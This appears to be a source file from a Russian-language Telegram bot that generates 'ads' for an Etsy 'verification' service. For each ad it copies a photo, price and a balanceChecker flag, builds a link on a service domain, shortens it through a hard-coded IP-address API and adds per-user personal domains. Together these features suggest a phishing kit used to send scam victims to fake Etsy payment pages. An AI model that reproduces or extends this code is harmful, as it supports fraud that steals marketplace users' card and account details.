const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles, MyDomains } = require("../../database");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");

const scene = new WizardScene(
  "return_etsy",

  async (ctx) => {
    try {
      ctx.scene.state.data = {};

      ctx.wizard.state.adId = ctx.match[1];

      await ctx.scene
        .reply("Введите название магазина", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.scene.state.data.code = "etsyverif_eu";
      if (!ctx.message?.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.title = escapeHTML(ctx.message.text);
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      const oldAd = await Ad.findOne({
        where: {
          id: ctx.wizard.state.adId,
        },
      });

      const service = await Service.findOne({
        where: {
          code: oldAd.serviceCode,
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      const { photo, balanceChecker } = oldAd;

      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        version:"0",
        balanceChecker: balanceChecker,
        photo: photo,
        name: oldAd.name,
        address: oldAd.address,
        price: oldAd.price,
        title: ctx.scene.state.data.title,
        serviceCode: oldAd.serviceCode,
      });

      const domains = await MyDomains.findOne({
        where: { userId: ctx.from.id },
      });
      const payload = {
        target: `https://${service.domain}/${ad.id}`,
        domain: service.shortlink || ctx.state.bot.shortlink,
      };

      const reduction = await axios.post(
        "http://185.208.158.144/api/create",
        payload
      );

      const personalDomainLink = domains
        ? `https://${domains.domain}/${ad.id}`
        : null;

      await ad.update({
        myDomainLink: personalDomainLink,
        shortLink: reduction?.data?.url || null,
      });

      log(
        ctx,
        `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
      );

      // Собираем сообщение
      try {
        await myAd(ctx, ad.id);
      } catch (err) {
        await ctx
          .replyOrEdit("❌ Ошибка при отображении объявления.")
          .catch(() => {});
      }
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;
